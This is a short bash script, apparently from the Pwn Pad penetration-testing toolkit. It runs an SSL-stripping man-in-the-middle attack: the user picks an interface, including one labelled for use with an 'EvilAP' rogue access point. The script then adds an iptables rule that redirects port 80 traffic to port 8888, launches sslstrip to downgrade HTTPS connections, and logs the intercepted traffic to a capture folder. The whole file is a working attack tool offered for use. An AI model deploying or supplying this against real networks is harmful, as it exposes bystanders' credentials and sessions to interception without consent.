#!/bin/bash
#SSLstripp script for sniffing on available interfaces

##################################################

f_interface(){
        clear

echo 
echo 
echo "Select which interface you would like to sniff on? (1-6):"
echo 
echo "1. eth0  (USB ethernet adapter)"
echo "2. wlan0  (Internal Nexus Wifi)"
echo "3. wlan1  (USB TPlink Atheros)"
echo "4. mon0  (monitor mode interface)"
echo "5. at0  (Use with EvilAP)"
echo "6. rmnet0 (Internal 3G GSM)"
echo

        read -p "Choice: " interfacechoice

        case $interfacechoice in
        1) f_eth0 ;;
        2) f_wlan0 ;;
        3) f_wlan1 ;;
        4) f_mon0 ;;
        5) f_at0 ;;
	6) f_rmnet0 ;;
        *) f_interface ;;
        esac
}

#########################################
f_eth0(){
	interface=eth0
}

#########################################
f_wlan0(){
        interface=wlan0
}


#########################################
f_wlan1(){
        interface=wlan1
}


#########################################
f_mon0(){
        interface=mon0
}


#########################################
f_at0(){
        interface=at0
}

#########################################
f_rmnet0(){
        interface=rmnet0
}

f_interface

#Setup IPtables for ssltrip

iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8888

#Path to sslstrip definitions:

clear
echo
echo  "Logging to /opt/pwnpad/captures/sslstrip/"
echo
sleep 2

DEFS="/opt/pwnpad/easy-creds/definitions.sslstrip"

sslstripfilename=sslstrip$(date +%F-%H%M).log
python /opt/pwnpad/sslstrip/sslstrip.py -pfk -w /opt/pwnpad/captures/sslstrip/$sslstripfilename  -l 8888 $interface &

sleep 3
echo
echo
tail -f /opt/pwnpad/captures/sslstrip/$sslstripfilename

# -l 8888 wlan0

